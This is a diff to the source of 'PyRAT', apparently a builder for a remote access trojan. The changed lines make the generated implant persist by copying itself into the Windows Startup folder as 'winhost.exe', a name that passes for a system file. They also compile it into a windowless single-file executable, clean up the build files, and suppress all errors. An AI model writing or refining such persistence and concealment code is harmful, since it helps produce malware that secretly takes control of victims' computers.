@@ -1079,7 +1079,7 @@ class PyRAT:
                 self.startup.toggle()
                 startup = r"""
 startup_folder = f"{os.getenv('appdata')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
-subprocess.run(f"copy \"{sys.argv[0]}\" \"{startup_folder}\"", shell=True)
+shutil.copy2(sys.argv[0], f'{startup_folder}\\winhost.exe')
 """
 
             if ip is None or len(ip) < 6:
@@ -1103,6 +1103,7 @@ import pyaudio
 from tkinter import messagebox
 import webbrowser
 import sys
+import shutil
 
 {kill_def}
 
@@ -1117,8 +1118,6 @@ rec_audio = False
 
 def show_error(text):
     messagebox.showerror("Error", text)
-
-
 {err}
 {startup}
 
@@ -1523,7 +1522,7 @@ except:
                     builder.write(data)
                     builder.close()
                     subprocess.run(
-                        f"python -m nuitka --onefile --windows-console-mode=disable --enable-plugin=tk-inter --mingw64 --standalone {ico}--output-filename='{filename}' .\\builder.py",
+                        f"python -m nuitka --onefile --windows-console-mode=disable --enable-plugin=tk-inter --mingw64 --standalone {ico}--output-filename=\"{filename}\" .\\builder.py",
                         shell=True)
                     subprocess.run("del builder.py", shell=True)
                     subprocess.run("rmdir /S /Q builder.build", shell=True)
@@ -1547,5 +1546,5 @@ if __name__ == '__main__':
         PyRAT(root)
         root.mainloop()
 
-    except Exception as e:
+    except:
         pass
